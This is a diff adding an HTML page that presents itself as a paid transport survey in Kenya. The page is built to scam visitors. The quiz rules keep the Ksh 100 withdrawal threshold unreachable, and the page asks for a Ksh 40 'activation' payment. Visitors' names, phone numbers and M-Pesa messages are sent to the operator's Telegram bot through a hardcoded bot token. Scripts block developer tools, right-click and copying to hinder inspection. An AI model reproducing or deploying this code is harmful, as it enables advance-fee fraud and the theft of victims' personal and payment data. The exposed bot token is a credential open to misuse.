@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Health Survey | Peter Simiyu 2026</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background: linear-gradient(to right, #00c6ff, #0072ff); color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 20px; }
+        .container { background: rgba(0, 0, 0, 0.7); padding: 25px; border-radius: 20px; max-width: 900px; width: 100%; margin-top: 30px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); }
+        h1 { color: #ffeb3b; text-align: center; margin-bottom: 20px; text-shadow: 1px 1px 5px #000; }
+        .question { background: rgba(255, 255, 255, 0.1); padding: 15px; margin-bottom: 15px; border-radius: 12px; }
+        button { margin: 5px 0; padding: 10px 15px; border: none; border-radius: 10px; cursor: pointer; width: 100%; font-weight: 600; transition: 0.3s; }
+        button:hover { transform: scale(1.03); }
+        #balance { margin-top: 10px; font-size: 1.1rem; font-weight: 600; }
+        #withdrawBtn, #submitBtn { background: #ffeb3b; color: #000; font-weight: 700; }
+        #withdrawalSection, #submitSection { display: none; }
+        #countdown { font-size: 1.2rem; text-align: center; margin: 15px 0; }
+
+        /* Improved styles for inputs */
+        input[type="text"],
+        input[type="number"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus,
+        input[type="number"]:focus,
+        textarea:focus {
+            border-color: #ffeb3b;
+            outline: none;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Transport & Infrastructure Survey</h1>
+    <button id="startSessionBtn">Start Survey</button>
+    <div id="countdown"></div>
+    <div id="survey-container"></div>
+    <div id="balance">Your balance: Ksh 0</div>
+    <button id="withdrawBtn">Withdraw</button>
+    <button id="submitBtn">Submit withdrawal Information</button>
+
+    <div id="withdrawalSection">
+        <input type="text" id="phoneNumber" placeholder="Enter your phone number" required />
+        <input type="number" id="withdrawAmount" placeholder="Amount to withdraw (ksh 65)" max="65" required />
+        <textarea id="commentBox" placeholder="Account activation message (MPesa message)" rows="4" maxlength="300"></textarea>
+        <button id="approveSubmitBtn">Approve & Submit</button>
+    </div>
+
+    <div id="submitSection">
+        <h3>Submit Your Information</h3>
+        <input type="text" id="username" placeholder="Enter your name" required />
+        <input type="text" id="submitPhoneNumber" placeholder="Enter your phone number" required />
+        <input type="number" id="submitWithdrawAmount" placeholder="Amount to withdraw (max Ksh 65)" max="65" required />
+        <textarea id="submitComment" placeholder="Account activation (MPesa message) " rows="4" maxlength="300" required></textarea>
+        <button id="finalSubmitBtn">Final Submit</button>
+        <p id="status"></p>
+    </div>
+
+    <p style="margin-top:10px;font-size:0.9rem;">© Summit solutions.co.ke 2026. All rights reserved.</p>
+</div>
+
+<script>
+
+
+const questions = [
+    {q:"What is the primary advantage of 'Intermodal Freight Transport' in logistics?", a:["Reduced handling time","Seamless transitions between different transport modes","Lower insurance costs","Higher speed than air freight"], correct:1},
+    {q:"In urban planning, what does 'Transit-Oriented Development' (TOD) specifically aim to maximize?", a:["Highway capacity","Residential parking spaces","Access to public transport via high-density housing","Total road surface area"], correct:2},
+    {q:"Which engineering challenge is most critical when designing 'Suspension Bridges' for long spans?", a:["Aerodynamic stability against wind","Weight of the asphalt","Color of the anti-corrosive paint","Number of vehicles per hour"], correct:0},
+    {q:"What is the main purpose of a 'High-Speed Rail' (HSR) dedicated track system?", a:["To allow trains to carry heavy freight","To eliminate interference from slower traffic and intersections","To reduce the cost of track maintenance","To enable trains to run on diesel power"], correct:1},
+    {q:"In maritime engineering, what does 'TEU' stand for in relation to container ship capacity?", a:["Total Engine Units","Tons of Energy Used","Twenty-foot Equivalent Unit","Transport Efficiency Universal"], correct:2},
+    {q:"Which phenomenon describes the increase in traffic that occurs after road capacity is expanded?", a:["Induced Demand","The Funnel Effect","Elastic Infrastructure","Traffic Saturation Point"], correct:0},
+    {q:"What is the primary function of a 'Smart Grid' within the context of electrical infrastructure?", a:["Increasing the voltage of power lines","Automating the billing process","Managing bidirectional energy flows and integrating renewables","Physical protection of power plants"], correct:2},
+    {q:"Which structural element in a tunnel primarily resists the pressure of the surrounding soil or rock?", a:["Ventilation shafts","The Lining","The Roadbed","Drainage pipes"], correct:1},
+    {q:"In aviation, what is 'Slot Allocation' at a major hub airport used to manage?", a:["The number of passengers in a terminal","Runway capacity and takeoff/landing timings","Fueling station efficiency","Aircraft maintenance schedules"], correct:1},
+    {q:"What is the 'Last Mile' problem in logistics and public transport?", a:["The difficulty of building highways between cities","The final leg of a journey being the most expensive and inefficient","The distance a vehicle travels before needing fuel","The mechanical wear on tires in the final year of use"], correct:1},
+    {q:"Which material is increasingly used in modern bridge decks to reduce weight and increase lifespan?", a:["Cast Iron","Timber","Carbon Fiber Reinforced Polymer (CFRP)","Unreinforced Concrete"], correct:2},
+    {q:"What is the main goal of 'Congestion Pricing' in metropolitan infrastructure?", a:["To generate profit for private road owners","To reduce traffic by charging users during peak hours","To pay for more parking garages","To eliminate the need for traffic lights"], correct:1},
+    {q:"In hydraulics, what is the primary role of a 'Siphon' in water infrastructure?", a:["To filter impurities","To move water over an elevation without a pump using atmospheric pressure","To increase the temperature of water","To store water for long periods"], correct:1},
+    {q:"What defines a 'Smart City' infrastructure approach?", a:["Replacing all roads with bicycle paths","Using IoT sensors and data to manage assets and resources efficiently","Moving all transport underground","Using only solar power for streetlights"], correct:1},
+    {q:"In civil engineering, what is 'Scour' in relation to bridge infrastructure?", a:["The painting process to prevent rust","The erosion of soil around bridge foundations by flowing water","The cleaning of the bridge deck","The stress test of the cables"], correct:1}
+];
+
+
+
+
+let db;
+let balance = 0;
+let answeredToday = 0;
+const BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
+const CHAT_ID = "8468538314";
+let lastUpdateId = 0;
+
+const request = indexedDB.open("TransportSurveyDB", 1);
+
+request.onupgradeneeded = (e) => {
+    db = e.target.result;
+    db.createObjectStore("progress", { keyPath: "id" });
+};
+
+request.onsuccess = (e) => {
+    db = e.target.result;
+    loadProgress();
+};
+
+request.onerror = (e) => console.log("DB error", e);
+
+function loadProgress() {
+    const tx = db.transaction("progress", "readonly");
+    const store = tx.objectStore("progress");
+    const getReq = store.get("user1");
+    
+    getReq.onsuccess = () => {
+        const data = getReq.result;
+        if (data) {
+            balance = data.balance;
+            answeredToday = (data.lastDate === new Date().toDateString()) ? data.answeredToday : 0;
+            updateBalance();
+        }
+    };
+}
+
+function saveProgress() {
+    const tx = db.transaction("progress", "readwrite");
+    const store = tx.objectStore("progress");
+    store.put({ id: "user1", balance, lastDate: new Date().toDateString(), answeredToday });
+}
+
+function updateBalance() {
+    document.getElementById("balance").innerText = "Your balance: Ksh " + balance;
+}
+
+function startSurvey() {
+    const container = document.getElementById("survey-container");
+    const countdown = document.getElementById("countdown");
+    container.style.display = "block";
+    countdown.style.display = "block";
+
+    let qIndex = 0;
+    let timeLeft = 120; // 2 minutes
+
+    const showQuestion = () => {
+        if (qIndex >= questions.length || answeredToday >= 3) {
+            container.innerHTML = "<h3>Survey completed for today!</h3>";
+            countdown.style.display = "none";
+            return;
+        }
+        const q = questions[qIndex];
+        container.innerHTML = `<div class="question">
+            <p>${q.q}</p>
+            ${q.a.map((opt, i) => `<button onclick="answer(${i}, ${qIndex})">${opt}</button>`).join("")}
+        </div>`;
+    };
+
+    window.answer = function (choice, qIndex) {
+        const q = questions[qIndex];
+        answeredToday++;
+        
+        if (choice === q.correct) {
+            balance += 10;
+        } else {
+            balance -= 7; // Deduct for a wrong answer
+            updateBalance();
+            container.innerHTML = "<h3>Survey stopped due to wrong answer. Come back tomorrow.</h3>";
+            saveProgress();
+            countdown.style.display = "none";
+            return;
+        }
+
+        updateBalance();
+        qIndex++;
+        saveProgress();
+        if (answeredToday >= 3) {
+            container.innerHTML = "<h3>Daily question limit reached!</h3>";
+            countdown.style.display = "none";
+            return;
+        }
+        showQuestion();
+    };
+
+    countdown.innerText = `Time left: ${timeLeft / 60} minutes`;
+    
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        countdown.innerText = `Time left: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')} minutes`;
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            container.innerHTML = "<h3>Time's up! Come back tomorrow!</h3>";
+            saveProgress();
+            countdown.style.display = "none";
+        }
+    }, 1000);
+
+    showQuestion();
+}
+
+// Start Session Button
+document.getElementById("startSessionBtn").onclick = () => {
+    document.getElementById("startSessionBtn").style.display = "none";
+    startSurvey();
+};
+
+// Withdraw Button Logic
+document.getElementById("withdrawBtn").onclick = () => {
+    if (balance < 100) {
+        alert("Minimum balance to withdraw is Ksh 100.");
+    } else {
+        if (confirm("Activate your account ksh 40?")) {
+            window.location.href = "https://summitsolutions28.github.io/Well8372/S1920.html"; // Redirect to YouTube
+        }
+    }
+};
+
+// Approve & Submit Logic for Withdrawal
+document.getElementById("approveSubmitBtn").onclick = () => {
+    const withdrawAmount = parseInt(document.getElementById("withdrawAmount").value);
+    
+    if (!withdrawAmount || withdrawAmount > 65) {
+        alert("Withdrawal amount must not exceed Ksh 65.");
+        return;
+    }
+    if (withdrawAmount > balance) {
+        alert("Insufficient balance for the withdrawal.");
+        return;
+    }
+
+    if (confirm("Do you want to approve this withdrawal?")) {
+        balance -= withdrawAmount;
+        alert("Approve to send withdrawal request.");
+        balance = 5; // Reset balance
+        updateBalance();
+        submitWithdrawal(withdrawAmount);
+    }
+};
+
+function submitWithdrawal(withdrawAmount) {
+    const phoneNumber = document.getElementById("phoneNumber").value;
+    const comment = document.getElementById("commentBox").value;
+    alert(`Withdrawal request submitted for Ksh ${withdrawAmount}.\nPhone: ${phoneNumber}\nComment: ${comment}`);
+    // Send the request to the Telegram API
+    sendTelegramMessage(`Withdrawal request: Ksh ${withdrawAmount}. Phone: ${phoneNumber}. Comment: ${comment}`);
+}
+
+// Submit Information Button Logic
+document.getElementById("submitBtn").onclick = () => {
+    if (balance < 100) {
+        alert("if account already active submit withdrawal request.");
+    } else {
+        document.getElementById("submitSection").style.display = "block"; // Show submit section
+    }
+};
+
+// Final Submit Logic
+document.getElementById("finalSubmitBtn").onclick = () => {
+    submitComment();
+};
+
+// Submission Logic
+async function submitComment() {
+    const username = document.getElementById("username").value.trim();
+    const comment = document.getElementById("submitComment").value.trim();
+    const status = document.getElementById("status");
+
+    if (!username || !comment) {
+        alert("Please fill all fields.");
+        return;
+    }
+
+    status.innerText = "Verification in progress...";
+
+    // Send message with inline buttons
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `New Comment\n\nName: ${username}\nComment: ${comment}`,
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Approve", callback_data: `approve_${username}` },
+                        { text: "❌ Reject", callback_data: `reject_${username}` }
+                    ]
+                ]
+            }
+        })
+    });
+
+    monitorApproval(username);
+}
+
+function monitorApproval(username) {
+    const status = document.getElementById("status");
+
+    const interval = setInterval(async () => {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+        const data = await res.json();
+
+        if (data.result.length > 0) {
+            data.result.forEach(update => {
+                lastUpdateId = update.update_id;
+
+                if (update.callback_query) {
+                    const dataValue = update.callback_query.data;
+
+                    if (dataValue === `approve_${username}`) {
+                        clearInterval(interval);
+                        status.innerText = "Verification Successful ✅";
+                        // Redirect or perform additional actions here
+                        window.location.href = "https://summitsolutions28.github.io/Testing-/S1999.html";
+                    }
+
+                    if (dataValue === `reject_${username}`) {
+                        clearInterval(interval);
+                        status.innerText = "Verification Failed ❌";
+                    }
+                }
+            });
+        }
+    }, 4000);
+}
+/* ================================
+   ANTI-CHEATING SYSTEM
+================================ */
+
+// Flag to track cheating
+let cheatingDetected = false;
+
+// Function to stop survey immediately
+function stopSurvey(reason) {
+    if (cheatingDetected) return;
+    cheatingDetected = true;
+
+    const container = document.getElementById("survey-container");
+    const countdown = document.getElementById("countdown");
+
+    container.innerHTML = `<h3 style="color:red;">Survey terminated: ${reason}</h3>`;
+    countdown.style.display = "none";
+
+    balance -= 3; // Penalty
+    if (balance < 0) balance = 0;
+    updateBalance();
+    saveProgress();
+
+    alert("Cheating detected! You are blocked for today.");
+}
+
+/* 1️⃣ Detect Tab Switching */
+document.addEventListener("visibilitychange", function () {
+    if (document.hidden) {
+        stopSurvey("Tab switching is not allowed.");
+    }
+});
+
+/* 2️⃣ Disable Right Click */
+document.addEventListener("contextmenu", function (e) {
+    e.preventDefault();
+    stopSurvey("Right-click is disabled.");
+});
+
+/* 3️⃣ Disable Copy, Paste & Cut */
+document.addEventListener("copy", function (e) {
+    e.preventDefault();
+    stopSurvey("Copying is not allowed.");
+});
+document.addEventListener("paste", function (e) {
+    e.preventDefault();
+    stopSurvey("Pasting is not allowed.");
+});
+document.addEventListener("cut", function (e) {
+    e.preventDefault();
+    stopSurvey("Cut action is not allowed.");
+});
+
+/* 4️⃣ Detect DevTools Opening */
+(function detectDevTools() {
+    let threshold = 160;
+
+    setInterval(function () {
+        if (
+            window.outerWidth - window.innerWidth > threshold ||
+            window.outerHeight - window.innerHeight > threshold
+        ) {
+            stopSurvey("Developer tools detected.");
+        }
+    }, 1000);
+})();
+
+/* 5️⃣ Disable Keyboard Shortcuts (F12, Ctrl+Shift+I, Ctrl+U) */
+document.addEventListener("keydown", function (e) {
+    if (
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && e.key === "I") ||
+        (e.ctrlKey && e.key === "u")
+    ) {
+        e.preventDefault();
+        stopSurvey("Unauthorized keyboard shortcut detected.");
+    }
+});
+</script>
+</body>
+</html>
